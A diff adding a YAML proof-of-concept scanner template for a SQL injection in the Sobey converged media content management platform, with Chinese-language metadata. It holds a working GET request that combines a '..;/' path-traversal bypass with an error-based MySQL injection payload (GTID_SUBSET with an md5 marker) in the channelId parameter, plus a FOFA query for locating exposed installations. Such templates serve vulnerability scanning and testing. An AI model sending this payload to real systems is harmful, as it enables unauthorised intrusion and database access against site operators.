@@ -1,0 +1,17 @@
+id: poc-yaml-sobey-imcmp-countjztarticlegroupbychannel2-sqli
+info:
+  name: 索贝融合媒体内容管理平台 countJztArticleGroupByChannel2 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{.t1}})))),0x7e),1709)
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"Exception
+    Report") && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
+transport: http
